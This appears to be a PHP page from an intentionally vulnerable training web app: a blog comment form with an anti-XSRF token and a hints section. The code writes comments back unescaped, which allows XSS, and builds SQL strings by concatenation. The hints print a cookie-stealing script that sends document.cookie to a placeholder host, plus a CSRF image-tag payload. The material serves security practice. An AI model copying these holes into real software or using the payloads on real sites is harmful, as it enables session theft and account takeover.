<center><h2><b>Add to your blog</b></h2></center><p>

<form method="POST" action="" .$_SERVER['SCRIPT_NAME'] . "?" . $_SERVER['QUERY_STRING']>
        <p>Welcome to your blog, leave an entry. Login, or you will be listed as "anonymous":</p>
        <!--<p><input type="text" name="user_name" size="20"></p> -->
        <p><textarea rows="10" cols="50" name="input" size="20"></textarea></p>
        <input type="hidden" name="xsrf_token" value="<?php echo generateToken('protectedForm'); ?>"/>
        <p><input type="submit" value="Submit" name="Submit_button"></p>
</form>

<?php

function generateToken( $formName )
{
    if ( !session_id() ) {
        session_start();
    }
    $sessionId = session_id();
    return sha1( $formName.$sessionId );

}

function checkToken( $token, $formName )
{
    return $token === generateToken( $formName );
}

if ( !empty( $_POST['xsrf_token'] ) ) {

    if( checkToken( $_POST['xsrf_token'], 'protectedForm' ) ) {
// Grab inputs
$inputfromform = mysql_real_escape_string($_REQUEST["input"]);
$showonlyuser =  $_REQUEST["show_only_user"];
if ($inputfromform  <> "") {
        $query = "INSERT INTO blogs_table(blogger_name, comment, date) VALUES ('".
                $logged_in_user . "', '".
                $inputfromform  . "', " .
                " now() )";

$result = mysql_query($query);
}

$query  = "SELECT * FROM blogs_table WHERE
                blogger_name like '{$logged_in_user}%'
               ORDER BY date DESC
                LIMIT 0 , 100";

$result = mysql_query($query) or die(mysql_error($conn) . '<p><b>SQL Statement:</b>' . $query);;
//echo $result;

echo 'Entries:<p>';
while($row = mysql_fetch_array($result, MYSQL_ASSOC))
{
echo "<p><b>{$row['blogger_name']}:</b>({$row['date']})<br>{$row['comment']}</p>";
}
echo "<p>";

        echo "anti-XSRF token OK" , "<br> <br>";

    }

}
// Begin hints section
if ($_COOKIE["showhints"]==1) {
        echo '<p><span style="background-color: #FFFF00">
        <b>For XSS:</b>XSS is easy stuff. This one shows off both reflected (you see the results 
        instantly) and stored (someone can run across it later in another app that
        uses the same database). "&lt;script&gt;alert("XSS");&lt;/script&gt;" is the classic, but 
        there are far more interesting things you could do which I plan show in a video later. 
        For some hot cookie stealing action, try something like:</p>
        <pre>
        &lt;script&gt;
                new Image().src="http://some-ip/mutillidae/catch.php?cookie="+encodeURI(document.cookie);
        &lt;/script&gt;
        </pre>  
        <p><span style="background-color: #FFFF00">
        Also, check out <a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheat Sheet</a>
        for more ways you can encode XSS attacks that may allow you to get around some filters.
        <br><br>
        <b>For XSRF:</b>Ok, what you have do is create another page someplace and
        make a link to an image that is not an image. You could use something like 
        the following:
        <br>
        &lt;img src="http://dojo-basic/index.php?page=add-to-your-blog.php&input=hi%20there%20monkeyboy"&gt;
        <br>
        This is the easy way to do XSRF with the GET method. Just login as someone, make 
        your page with the link image someplace else, and then view it. You should now see
        something new on the comment wall. :)
        <br>
        <b>WATCH OUT for the new anti-XSRF token!!!!</b>
        </span></p>';
}


?>

                                                                                                                                